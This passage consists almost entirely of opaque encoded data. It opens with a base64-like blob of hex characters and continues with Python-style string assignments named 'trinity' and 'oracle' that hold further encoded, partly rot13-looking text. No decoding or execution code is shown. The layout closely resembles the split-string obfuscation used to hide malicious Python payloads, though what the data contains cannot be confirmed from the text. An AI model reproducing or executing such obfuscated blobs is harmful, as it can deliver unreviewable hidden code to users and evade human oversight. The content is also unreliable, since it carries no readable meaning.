NTVhNjUzNjJmMzg0MTUwNmE3ODRiNGU2NjZlNDY1NTJmNzg2NzMzNzE3NDU0NTA2Njc4MmY3YTQ2NjU1MDUwNjczNzM4NTQ3MDZiNzY3MTM0NDU0MjM5Njg2YTM3NDU1NzZmNzIzMzQ4MzI0MTRlNzU2MzcyNzk2NDM0NDQyZjc4Njg0ZjM4NDI1MDcwN2E2ZjU4MzY2NzMzNGY3MzZlMzM2YzRhNDYzNTYzNGY0NDM0Nzg0MTJiNGY1NzM5NDc2NTMxNGMyZjY3NzI2NDUyNjI2ZDYzNzc0NjM0N2E0MzJmNDEzMDY2MzU0ODc2MzQzMjQ5NGEzNTcyMmI2ODcyNmE2MTQzNjYzNTU1MmI3YTQ5NmQ0NDMyN2E1MDcxNTEyYjU5NTIyZjU3NmU1MzUwNzUzOTY2NTQzMzY3NmE2NzM4MzE2YTM2Mzk2YTQzNjYzMTQ3NGM0NjUzMzY2YTM3NmY0ZDMyNTQ2NTRkNzc1NDUwNjc0NTRmMzc1MTY2NDkzNDM4NjMzNTZkMmY1NjQzMzQ3MjQ1MmI1YTQ4MzY0NjY2NmMzODM5NTQ0Yzc1NmY1NjJmNzA2MjZjMzQ2ZTY1NDk0ZTM5Njc1MTM5Mzc2ZDQzNzMzMjY2NmQ3ODVhNTg2YjdhNTY3YTc3NTY1MDQ5MzMzODc5NGM2OTZkNjY1ODZiNjk0NzRmNzM0NDc4NmM2ZTc1NjQ2OTRlMzg2MTc3NDY3YTJmNDQ2NTZkNzY1NjRmNzk2MjY3NmU2MjY3MzY0ZDRjMmI2YTY0NDU3MjJmNDIyYjRkNTE2ODdhNDI2NjZhNTM2ODMyNDQ3NTUzNDE2NjczNzUzNDYzMzc1OTcyNmU3ODQ0Mzc0NTRiNDY3NjU3NDEzOTUxNmUyZjQ1NGE3NzRjNTM0Zjc1NTU0NDJiNjEzOTU0NjI3YTRmNDg0ZDRmNzg2ZDU3NjQ0MzMxMmI2ODMzNzY2NzJiNzE1NDY0N2E2MTM4N2E2Mjc3NGY2NTRkMmY3MzUzMzg0ZjJmNzE2NDMxNDk0ODc5MzczMTZhNjk1OTc1NTY2OTMzNDQ1MDQ4NTE2ODM3NDQ3NTRhNzIzMTUxNjk2MjcyNDM2NDYyNzg0OTJiMzU0NDU2NjkzMTJiNjM2ZDUxNjQyZjU3NTMyYjY4MzYzMjZkNGQ2ODJiNGE2ZDU5NzIyYjUwNGI0NzY2NTMzOTM2Njk2MjRjNTE2NDMxNjg3NjMwNjUzODcxMmY0NTdhNzc1NDJmNTc0MzYzNDM2ZTcxNDE2NjM5NTc0ZDRjNjM2MjUwNmI2NjU4NmI2NDQ2NzcyZjM1NTA3OTY0NjQ2MTU0NDk0MzU4N2E3NTcwNDk1YTZiMmY2NTQ5N2E3MjM3NDk1NzQ5NDMzNDY3NTg2ZjQzNGE2ZDc2Njc3MjJmNzI2ZTJiNGE1ODU1MzUzODM0NTQ1MDc1NGQzNzcwNTkzNjc3NmE2ZTY4NGM3NjRjNzY0ZDM4NzM1MTRhMmI1NjZiNzY2NTM3NTE1ODMzMmI1YTc2NTAzMzMxNmUzMzczNGE2MTZjNjY0ZDUyMmY3MzUzNjY0NzU0NmIzNjQzMzU1MTUwMzA2Nzc2NzM1OTQxMzY0ZDJmNzc3NTM4NTE2MjMyNGU2NTc3MzM3NTZjNzY2NzYxNjU2OTZlMmI2ODZlNmQ0ZDM5Njc2ZTZmNTIzOTY0NGE1NDYzNDk0YzMyNWE0MzM1NjkzNzRkNDY2NjQ5NDI2NjM4Nzk0MjRlMzg0ODc2NDU2ZDZlNmI3MDJiNzA0MjM3NTA3NDQyNjUyZjQ4N2E0ODJmMzM0YTQ0NzI1YTM5Mzc0NDRmNjc0NDMyNDU0NDc4NmQyZjYyNDE2MjM4NTg2MjRkMzE1NjUwNjk1MDY2NTU3MDY1NTUzNzM4NmE3NjRmNDQ1ODQ5NGI2YTU3NzY0YjU1MzQ0NDVhNzc2MTQzNTYzNTc1NzA0YjM0Njc0NjMzNDg0NzZiNTY3OTU3Njk2ZTM1NWE1ODYzNjU2MzU4NDc3MzY3MzU0MzZlN2E2Zjc4NjYzNTc5NzQyZjQ4NDI2ZDMzNzU0ZjM0Nzc1ODczMzU1MzU5Nzg0ODM3MzY3MTM5MzY3ODYxMzI1OTcyMzA3YTRhNDEzODUyMzE1OTcxNjY0YzY2NDk1NjM1NDM1NTM3NDI2YTc1NDk1ODM4NDg2ZTU3NzE0NjY4NjY3MjcwNjc1ODY2NjU3MTQ4NjQ1OTcyNmI2YTU1MzczMDUzNGMyZjZhNGY2ZjQ4NmE2Njc0NTYzMTU5MzE3YTRiNmU0ZjZjNTA2ZTU2N2E2ZTY1MzM3OTcwNTU3OTUzNGY0ZDRlMmI2NTY1NzQ3NDc4N2E1MzUyMzU2NzZlMzc0MTY0NTc1ODYzNTM1NjM3NjcyYjZlNjE1MTc0NTI1MjZhNmM2NTc1MzczMDMxNGE3OTQyNzY0NzQ2MmI1MjYyN2E2YjY2NzE0ZDJiNjQ3MzVhMzYzMDQ4Njk0YzUwMzI0MjRlNjU3MzQxNGYzMDc0NjQ3MjcyNzU3ODdhNzU0ZDM2Njg3NjU1MzAzOTYxNGE0ODY2NTM0Mjc2NTM0ODMzNDk3NjRhMmY2ODc1NWE3MDc4NDI2NjMyNjU3NjM5NjI1YTZhNGYzODdhNmU3YTZjNGI1MDZkNTUzODcyNDM1NDY2MzY2MjQ4NzU2NDQyNTg3MjYyMzE2YjY2NTM1Mjc5NDk2NjY1NDM0ODRjNzU1NjRiNTQ2ZDRkNjM0NTRkMmI0YTJmMzE3ODZlNDEzNjY0NmY1MDM0NzY3MjYyMzk3MDVhNGQzNDM3NDc2NTZmNmEzMTQxMmI3NDMyNzE1Njc0NTI1MDM4NzIzNjY4NmU2YjM2Mzc2ZDU1Mzk0YTc2NmQ0Nzc1NDU2ZjM4Nzc0ODU4Njk2YTRkNzk1ODYzNTg2NzYzMzg3NzdhNTc1ODUzNGQ0ZjczMzIzNTY3MzM2NTVhNGE0ODcwNjIzMTMyNGM2NzRmNjg3NDM5MzgzMTU4NzkzMDQzMzI0ZTU2MmY0YTY0MmI0MTM3MmYzMTU3NjU2NTU2MzQyZ'
trinity = 'wpjAmD2LwD0AmV2ZwH5ATR3BQplAmp1BQZmZmL0BGH4AQp0BGL1AQHmZmLmAwx2BGMyAGNmZGWzAzL3BGD4AmL0MwD3A2R3LGpkATL2AGH5AzD1BGMwZmZ0MwWvAGx3LGZkAQVmZmExZzV2MwHlZmx1LGMuZmN0Mwp1AQplLwHkZmp2LGH1AGplMwExAmpmAQEvZmp0AGpmAwL0AGD0ZmV0MwZjATLmZmp5AzLmZGMwA2RmZmZ5AQZ1ZQWvAmtlLwHjZzV3AmD2AwD2ZmD2ATH1ZmDlZmR0AmH4AQH1AGL1AGx2AQp5AJR2AGp3AQRlLwEuATLlMwEuZmpmZwZ0AwL3ZGD3ATL0MQZmZmx0AGEzZmL3ZwpmAQpmAGDlAzH3ZGH5AwL1LGLlATZmZwL4AGLlMwD4ZmZ1AwL2ZmxmZmZ5ATL3AGH4AGNmBQHmAQLmAwHlATL3BQHjAmx0LmpmZzLmAGLkZmRmZQp2ZzV0MGMvAwRmBQIuAwVmZmDkAwD1ZwMyA2R0LwL0AwL0AQH1AmN2AQEuZzL1AQEzAmH2ZmZkAwx1BQZ3AGp1ZGZ5ATHmBGLkAmt2LmEvAmH2ZmMuAGN2AmZmZmV2MQHjAwZ1ZQWvAQZmAwD1ZzVlMwp4AmZ2AGZ3AzV0MwL4ZzLmZGZmAGL0LmZlAGV2ZwDlAmH1Zwp2ZmZ3BGD2AGt3AGHkAGZmZQMvZmt2LGH4AGH3ZmZ0Amt3AQZkAwp3BGp2Zmp0BGLmAmp1BQH1ZmR2MQMyAGZ2ZwquAzD2LGD1AmL0MQDlAwL1LGMuAwL3ZGZ1AzZmZmLmATHmAwMyAzH2MQHlZmLmZQH4AmR1LGp4AzR3ZwD5ZzV0ZGZ0AwZmZGMyAQp2AwHmAwL0Awp1AQH2ZmLmAwZ0AQZ5AQLmAwMxAzH1AmZkZmNlMwMxZmpmZQEwAmR1AGEyAwVmAmplATR2MQHjAmD3Zmp3AQD2AGH4AQp0MQHmAGpmBGLmAwtmZwLlAwZmBGWvAQplLwDkAmLmZwH5ZmxmZGH2AwZ0MGZlAQD2AQZ0AwZ0Zwp1AzV0MGL0AzH1ZQp0ZmpmZGH1AzZmBGHkATZmZGp3AmL3AGH2ATZ1BQD3AzR3AGHlAwplMwH1AzHmAQL4ATHlLwpmAJR0BGZ0Awt2AQZ2ZmH2LGWvAQt0BQMzZmxmBQp4AQV2MQH1Zmx3BQp2ZmN1BGMuAQpmBQEuAzH3ZGDkATLmAQH0ZmL0ZwZlAQxmBGZkAQt2MQpmAzZmZwH5Zmt2ZGZ4AJR0LmZ1AmN2AGHlZzV2LmWzAGpmZGZ3ZmV0MwEyZzVmZGMxAmx2MGMxAGHmBQZjAGx2ZmL4ATHlLwpmATD3ZwMuAwZ0AGquZmD2BGMyAGt0MQL2Awp2AQZ2Zmp1AQMxAQZ2AQMwAGN1ZGL1Zmx1BGL4ZmDmZGZkAmp0AQMuAwL3Zmp4AGZmBQMuAQt3ZwEvATH2ZGD4Zmx0ZwWzAGp0MGZ3AmZ3BQplAzZ2LGL2AQH2BQL2AmpmZmMvATZmZwDmZmL0AGH4Amt3AGExAwL3AwWzZzLmZwLmAGDmBGL0AGD3BQZ4Zmx3AQp5ZmZ2LGpjAmNmAmD2Amt2AQMwZmH1ZwMyAwV3BQL0ATLmZwL5AGt3ZQp2AQL3ZmZ3AQZ2AQD5AGD0AmLmATL0AQL3Zmp2MQH3AmD0AwquZmt2BQp3ZzL0MQZ2AwZlLwIuAmL0ZwpkAGDlLwExZmD2AmMwATHmZGHlZmx2MQZ1AQV2AQZkAGH2Zwp1ZmV1AGWzATHmAwH5AmZmBGL5ZmRmBQHkAmLlLwEyZmRmAmEzAmVmAGLlATLmZmH2A2R2AQMxAQx1BQZ5Amt1ZmH3AQH3BGLkAGtmAwEyAzH1BGMuAzLmBGD5AwH2ZwpkAGL2Lwp5AGH1AmWzZzVmZQZ4AQRmZmp4AQp2AQH0AQp3ZmExAwRmAQZ3AwZ1BGLlAQR2BGp2A2R0AmLmAmH3ZwD1Amt0BQL5AGL0AGZmZmx1BGquAmL0MGEwAGN2BQWzAGtlMwHkZzV0MQD1ZmN3AmMzZmR3BGp4AmH0BQp3Zmp2LwL0AGp3ZGEyZmxmZmH4ZmV3LGD4AwZ0MGZ2ATD1ZQHkAGDmBQL4AmDmBQH4ZmV2ZwquZzL0AwZ5AQV2AGZ1AwL0AmZ5AmR1ZQpkAmR0BGEzAQx0ZwL1ZzV1AGquZmp0MwLkZmR2BQD0AwL2Mwp4AzH0LGH3AGx1ZwL1Zmx1ZmMyAwp2AGL1AGR2AGp5AGN0BGZjZmN0ZGL2AzV0AQMvAmH3ZQMvZmH0MQL2AwR2BGD4AQHmZQLmAzDmBGD3ATR1AQZ3AmH0BGIuAzD2Zwp4ZzL0Awp1AmH0BQMvZmN1AmH1AQZmAmEuAwp1ZQplAmx3AwMuAmR2AmH4A2R0L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'
oracle = 'QyYjQ3NjY2NTM3NjQ0MzY2NzY2YjQ4MzM0NzUwMzMzNzJmMzc1ODYyNjY2YzM1NjM0NDY0NzkzMjM1NzQ2MzMzNTc2YTYyNTQ1MTUzNGYzMDVhNGU0Njc2NmI3NDU2NDMzNDc4NzUzOTczNzIyZjY5Nzk0ZTUzMzA3NDZmNzE1NzMwMzI0OTU4NDMzOTZmNzM1NTZjNjQzMTUxNDc2YjRiNjg3OTRkNjE1NzM2NmY2Zjc0NDUzNzU5NGI0MjM3NTk0ZjUyNzc3MTY5NTU0MTMxNjM2MTY1NTY1OTZkNzEzMjYzNjMzODM2NTc0ZTU3NmI3Mzc4Njk3MjRjNzAzMTJiNzQ2YjMzMzY1YTUzNTU3NTU0NjI1MzQ3MzI0OTY0Njc1Mzc3NDg0ZDc4MzU2MzQyNTk2NTUwMzk0OTYzNjI1MzZiNjg2MzZjNTc0ODRjNjU0MTUzNWE2MzM4NGIzNzYyNzk1MzRkNTgzNTZmNmMzNjc4NzA1MzQ3NTU0MTRjNWE0ZjY1MzE0OTc3Mzg2NDM1NGI3MTQ0Mzk0MzQ2NTc1MjcyNGY2MjZiNzM0Mjc4NmQ1MDU2NDI3MTY4NzgyYjY4NDI3MTQ5NDM2YjUwNjg3MDZhMzI3ODYyNjYzMjU1NGM2NzMxNmU0MzMyNmQzNDc4NTU1NDU3MzQ2YTczNzE1NTc2MzE0MjcxMzIzNjZmNTg0MzU1NDU2OTcyNmU2Yzc2NGY2MzYzNjMzMjY5NTc2MjcyNmQ3NTMxNzM2MTUxNmM0YTUzMzY1MzUzMzE2YTQ4NjI3YTU3NjQ3MDZiNjI0ZDQ2NGM0YjMxNTA1MDU2NDkyYjJiNzI0NjMxNDE1MDMwNGQ1OTc5NzU2MTU3MmIzODZhNmM1YTQ2NTU2OTRlNmE2OTU2NzY3MDc1NzA0YjVhNzk1MzM3NzM1NDM2Njk2NDYyNzY1ODc4NjU1NzcxNDY3MzRhNTg0NzcyNTgzNDM4NzQ2NjQ3MzY1MDUxMzkzNjUyNTY2YjQ0Mzc3MzY3NTY0NjY5Njk0YjcwNjU3MDY5MmY1NTRlNmQ0YjM4MzE0OTZmNGYzNzZkMzA1MDcxNTI1NjU4NTU1MDQ4MzA3NjQ5NmI0YTVhNDI2MjJiNmI2NTZhNDc0YjZjNzM3NDQ5NjMzNTc0NmQ2YTU5NGY2OTU0NmM2NzY0NTE1NDc0Njc3NDY3MzUzNDMwMzM3NDc1NzE0NTZiNzA0MzYzNzA2NjU4NmU0MzczNTg0MTZjNjg2MTMxNzQ0YjQyN2E3NTU4MmY1NTUxMzI1NTQ5NWE1MzRmNTQ2YzcyNjQ1MTQ1NjY1MzVhMzE0MzdhNTk2ODY2MzQ2OTcyNTg1NzMyMzQ1NTZhNTY2YjU2NTk2ODcxNTU2MzY0NTczMDUwNTM3MzY4MzY3MDU2MmY1MTU2NjE1OTQ2NDk0NzMwNTA2ZDUxNjY3MTRkN2E0MTUwNzY0YTM4NTc0NTcyNTMzNjMyNDk0ZTZjNjE3MDY0MzU3OTZmNTI0Yjc4NjQ2MjQ1NTQyYjUyMzIzMjQ2MzI3OTMyNTQ0YTY0NjY2NjZhNTMzMjc5NmE3OTMyN2E3NDZiNzE2YzM3NjEyZjMyNDkzMzc0NGM0NjQ5NjM1MzYzNTU1MjJmNWE0YzYxNTY1OTMxMmI1MjRkNzE2MTc0NGE2ODRiMzA1MzJiNzA1NjVhNzI3NDcxNGE3MTU1NDU2ZDZlNGU1OTdhMzc3NzU3Mzc1OTMzNjg0ZjcwNDQ0ODU3NzA3MDQ4NjQ0OTJiNzY0NjM5NjE1MjU1NDk1MjcwNDUzNzM1NTA0ODM4NmUzNTVhNjM3NDY5NWE2YTZhNTQ0OTU0MzY1MTc1NzE0MjU1NDI1MDU3NzYzNDUxNDM3NzMxNTk3MDU3Mzk1MjczMzQ1NjY5NmI2YTc1NTc2YjRkNjg3NjUzNzU3MzM3NTk1NTY5NDg3NDU0Nzk2ODQyNjI1MDU1NDk1NjU4NDM2YjU4NmY1NjZhNjEzNTU4Nzg2NTM1NWE1Nzc5NDI2OTc2NDk2YTM5NjI3ODdhNDg2YTZkNmM1MjVhNzQ3MjVhNDk0ZjUzNGQ0NjY0NTc3OTRlNTMzMDczMzQ0ODcxNmQzNDYyNGI1NjZkNzA1MDQzNzc3ODUzNGQ3NDU5MzE3NTZmNDc3MTRhNTAzMDY3NGIzMTU1NGE1NjRhNmE3ODcwNjI2Yjc0NGM3MTQ5NTg1NzY3NGEzMjU2MzU1MjM5NzE1Nzc0NDY1MjRhNDg1ODQ4Njc2MjM0Nzc2YTc0NmI2ZjVhNjEyZjQ1Njc0YzUyMzc0NzM1NGM2ZTM4NjE3NDMwNzk0NDcxNjg1NDYxNTY1NjJmNTU1NDY0Nzk1NTc5Njk0YjU5Nzk3NTc5NDc2Yzc0NTg2YzRhMzI1NTdhMzc0OTYyNzE1MjQ4Njk1YTM5NTM0YzU1NGQ0NzY3NTgzMjZlNjg2YTZjNTE3ODMyNmE3MzU3NzY1NzQ4NGQ1NDcxNjc3OTYyNDczMjM1NjI0ZDQ1NGI0YTYzNTE1NTRiNzA0ZTUxNTIyZjY4NzY1NTZmNmE2NzY4N2EzNzZhNjk0YzQ2NjQ2YTUzMzMzMjZhNGU1MzM1NjM3NjcyNTY2Yjc1MmY1YTYxNzA0YzMyMzc0ZDQyNTc0YjY1NjY0NjZjNzY3NjU5NTk2OTY0NDY2NTRiNTQ2ZjRhNDU0OTQ2NDE2MzM2NTE0MjczNTIzNTU0NTAzNjY5NGEzODQ1NGY0ZjM4NmY2YTY1NmQ1MDYzNDg3NjZkNjU1NDczNTk2YzU2NTk1Nzc5MzA0ZTJiNDY0MTZiNDg0YjQ5MzE3NjYxNjI0MzMxNTg1OTM5NzY2NjcwNWEzODUxNzY